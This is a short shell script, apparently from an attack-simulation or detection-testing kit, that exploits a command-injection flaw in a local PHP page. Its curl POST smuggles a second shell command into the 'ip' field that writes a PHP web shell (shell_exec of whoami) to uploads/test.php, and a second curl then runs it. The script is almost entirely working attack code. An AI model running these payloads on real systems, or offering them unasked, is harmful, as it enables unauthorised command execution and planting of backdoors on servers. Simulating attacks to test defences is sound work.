#!/bin/sh
# Shortname: command_injection-suspicious_terminal
# Description: Executes a command injection to Spawn a Suspicious Terminal using PHP.

echo -e "\e[92mExecuting Command Injection to Spawn a Suspicious Terminal. This script executes a command injection, which writes a file to http://webserver/uploads/test.php, then executes that script"
curl -X POST -d "ip=1.1.1.1+%26%26+echo+%27%3C%3Fphp+shell_exec%28%22whoami%22%29%3B+%3F%3E%27+%3E+uploads%2Ftest.php&Submit=Submit" http://localhost/low.php
curl http://localhost/uploads/test.php
